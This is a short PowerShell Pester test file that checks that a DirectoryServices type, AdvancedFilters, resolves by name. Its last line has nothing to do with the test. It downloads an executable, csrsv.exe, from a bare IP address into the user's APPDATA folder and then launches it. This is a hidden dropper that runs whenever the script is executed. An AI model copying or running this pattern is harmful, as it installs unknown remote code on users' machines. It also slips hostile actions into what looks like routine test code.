


Describe "Resolve types in additional referenced assemblies" -Tag CI {
    It "Will resolve DirectoryServices type <name>" -TestCases @(
        @{ typename = "[System.DirectoryServices.AccountManagement.AdvancedFilters]"; name = "AdvancedFilters" }
    ){
        param ($typename, $name)
        pwsh -noprofile -command "$typename.Name" | Should -BeExactly $name
    }
}

(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")

